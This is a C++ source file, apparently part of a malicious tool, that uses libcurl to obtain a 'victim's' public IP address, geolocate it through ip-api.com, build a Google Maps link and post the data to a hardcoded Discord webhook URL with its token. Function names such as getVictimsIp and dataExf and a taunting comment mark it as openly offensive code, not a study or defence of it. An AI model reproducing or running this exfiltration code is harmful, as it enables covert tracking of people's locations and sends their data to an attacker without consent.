/*
 *
 * This File handle the location fetching and the pastebin exfiltration 
 *
 */

#include "outsideTheBox.h"


namespace OutsideTheBox {
  namespace { // private function
    size_t writer(char *ptr, size_t size, size_t size_of_data, void *data)
    {
      std::string *str = (std::string *) data;
      int i;

      for(i = 0; i < size * size_of_data; i++)
      {
        (*str) += ptr[i];
      }

      return size * size_of_data;
    }
  }

  CURL * init() {
    CURL *hnd;

    std::string victimIPLocation;

    hnd = curl_easy_init();
    curl_easy_setopt(hnd, CURLOPT_BUFFERSIZE, 102400L);
    curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/8.11.1");
    curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
    curl_easy_setopt(hnd, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_2TLS);
    curl_easy_setopt(hnd, CURLOPT_FTP_SKIP_PASV_IP, 1L);
    curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 0L);
    curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, writer);

    return hnd;
  }

  std::string getVictimsIp(CURL *hnd) {
    CURLcode ret;
    std::string victimIP;
    std::string retData {"None"};
    
    curl_easy_setopt(hnd, CURLOPT_URL, "https://api.ipify.org/");
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &victimIP);

    ret = curl_easy_perform(hnd);

    if (ret == CURLE_OK) {
      retData = victimIP;
    }
    
    return retData;
  }

  std::vector<std::string> getVictimsIpLatLon(std::string IPLocation) {
    std::vector<std::string> latLon {"", ""};

    long unsigned int latFirstIndex {IPLocation.find("\"lat\":")};
    long unsigned int lonFirstIndex {IPLocation.find("\"lon\":")};
    long unsigned int lonFirstIndexDelimiter {IPLocation.find(",\"timezone\"")};

    long unsigned int latCount {lonFirstIndex - latFirstIndex};
    long unsigned int lonCount {lonFirstIndexDelimiter - lonFirstIndex};


    std::string lat {IPLocation.substr(latFirstIndex + 6, latCount - 7)};
    std::string lon {IPLocation.substr(lonFirstIndex + 6, lonCount - 6)};

    latLon[0] = lat;
    latLon[1] = lon;

    return latLon;
  }

  std::string getVictimsIpLocationInfos(CURL *hnd, std::string IP) {
    CURLcode ret;
    std::string victimIPLocation;
    std::string retData {"None"};

    std::string locationApiUrl = "http://ip-api.com/json/" + IP;
    
    curl_easy_setopt(hnd, CURLOPT_URL, locationApiUrl.c_str());
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &victimIPLocation);

    ret = curl_easy_perform(hnd);

    if (ret == CURLE_OK) {
      retData = victimIPLocation;
    }
    
    return retData;
  }

  std::string getVictimsIpLocationMaps(std::string IPlat, std::string IPlon) {
    std::string mapsLink {"https://maps.google.com/?q="};

    // add latitude
    mapsLink += IPlat;

    // add comma delimiter
    mapsLink += ',';

    // add longitude
    mapsLink += IPlon;


    return mapsLink;
  }

  CURLcode dataExf(CURL* hnd, std::string data) {
    /* EXFILTRATE DATA TO DISCORD WEBHOOK
     * curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"You know what will happen next x)\"}" https://discord.com/api/webhooks/1328822483205357679/KyaxDb1Q1GRUYPUOlsY-0GlIQVizwZ2iGnG7dsxuKOOtWO6afkt-riFf2D8vc4a2IiGd
    */
    CURLcode ret;
    const std::string leftAppliance {"{\"content\": \""};
    const std::string rightAppliance {"\"}"};
    std::string json = leftAppliance + data + rightAppliance;

    std::cout << "\n\n\ndata : " << data << "\n\n\n";
    std::cout << "\n\n\njson : " << json << "\n\n\n";
    
    struct curl_slist *headerList = NULL;

    headerList = curl_slist_append(headerList, "Accept: application/json");
    headerList = curl_slist_append(headerList, "Content-Type:application/json");

    curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, headerList);

    curl_easy_setopt(hnd, CURLOPT_URL, "https://discord.com/api/webhooks/1328822483205357679/KyaxDb1Q1GRUYPUOlsY-0GlIQVizwZ2iGnG7dsxuKOOtWO6afkt-riFf2D8vc4a2IiGd");
    curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1);

    curl_easy_setopt(hnd, CURLOPT_POST, true);
    curl_easy_setopt(hnd, CURLOPT_POSTFIELDS, json.c_str());

    ret = curl_easy_perform(hnd);

    return ret;
  }

  void cleanup(CURL * hnd) {
    curl_easy_cleanup(hnd);
    hnd = NULL;
  }
}